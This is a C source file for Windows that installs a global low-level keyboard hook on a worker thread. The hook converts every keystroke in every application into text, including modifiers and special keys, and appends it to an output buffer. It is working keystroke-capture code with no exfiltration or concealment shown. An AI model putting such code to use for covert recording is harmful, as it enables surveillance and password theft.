/*
 * Copyright (C) 2026 Antonio Ricciardi
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "keyboard.h"
#include "keyboard_output.h"
#include "../logging/logging.h"
#include "../runtime/runtime.h"

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static HANDLE listener_thread;
static DWORD listener_thread_id;
static int listener_started;
static volatile int stopping;
static HHOOK keyboard_hook;

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vk = kbd->vkCode;

        int ctrl_down = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
        int shift_down = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        int alt_down = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;

        char buf[64];
        int len = 0;

        switch (vk) {
        case VK_RETURN:
            buf[0] = '\n';
            len = 1;
            break;
        case VK_SPACE:
            buf[0] = ' ';
            len = 1;
            break;
        case VK_TAB:
            buf[0] = '\t';
            len = 1;
            break;
        case VK_BACK:
            len = snprintf(buf, sizeof(buf), "[BS]");
            break;
        case VK_ESCAPE:
            len = snprintf(buf, sizeof(buf), "[ESC]");
            break;
        default: {
            BYTE key_state[256] = {0};
            if (shift_down) key_state[VK_SHIFT] = 0x80;
            if (ctrl_down) key_state[VK_CONTROL] = 0x80;
            if (alt_down) key_state[VK_MENU] = 0x80;
            if (GetKeyState(VK_CAPITAL) & 0x0001) key_state[VK_CAPITAL] = 0x01;

            WCHAR unicode_buf[8] = {0};
            int count = ToUnicode(vk, kbd->scanCode, key_state, unicode_buf, 4, 0);
            if (count > 0) {
                int utf8_bytes = WideCharToMultiByte(CP_UTF8, 0, unicode_buf, count,
                                                     buf, sizeof(buf) - 1, nullptr, nullptr);
                if (utf8_bytes > 0) {
                    len = utf8_bytes;
                    buf[len] = '\0';
                }
            }
            break;
        }
        }

        if (len > 0) {
            if (ctrl_down && vk != VK_LCONTROL && vk != VK_RCONTROL &&
                vk != VK_RETURN && vk != VK_SPACE && vk != VK_TAB) {
                char mod_buf[80];
                int mod_len = snprintf(mod_buf, sizeof(mod_buf), "[Ctrl+%.*s]", len, buf);
                if (mod_len > 0)
                    keyboard_output_append(mod_buf, (size_t)mod_len);
            } else {
                keyboard_output_append(buf, (size_t)len);
            }
        }
    }

    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}

static DWORD WINAPI listener_worker([[maybe_unused]] void *context)
{
    listener_thread_id = GetCurrentThreadId();

    keyboard_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                                      GetModuleHandleW(nullptr), 0);
    if (!keyboard_hook) {
        c2t_log_error("keyboard", "SetWindowsHookExW failed (error %lu)", GetLastError());
        return 1;
    }

    c2t_log_info("keyboard", "Windows low-level keyboard hook active");

    MSG msg;
    while (!stopping && !c2t_runtime_stop_requested()) {
        BOOL res = PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE);
        if (res > 0) {
            if (msg.message == WM_QUIT)
                break;
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        } else {
            MsgWaitForMultipleObjects(0, nullptr, FALSE, 200, QS_ALLINPUT);
        }
    }

    if (keyboard_hook) {
        UnhookWindowsHookEx(keyboard_hook);
        keyboard_hook = nullptr;
    }

    keyboard_output_flush();
    return 0;
}

int keyboard_listen(void)
{
    return (int)listener_worker(nullptr);
}

int keyboard_listener_init(void)
{
    if (listener_started)
        return 1;

    stopping = 0;
    listener_thread = CreateThread(nullptr, 0, listener_worker, nullptr, 0, &listener_thread_id);
    listener_started = (listener_thread != nullptr);

    if (!listener_started) {
        c2t_log_error("keyboard", "Unable to start Windows keyboard listener thread");
    }
    return listener_started;
}

void keyboard_listener_cleanup(void)
{
    if (!listener_started)
        return;

    stopping = 1;
    if (listener_thread_id != 0) {
        PostThreadMessageW(listener_thread_id, WM_QUIT, 0, 0);
    }
    WaitForSingleObject(listener_thread, INFINITE);
    CloseHandle(listener_thread);
    listener_started = 0;
}
#endif
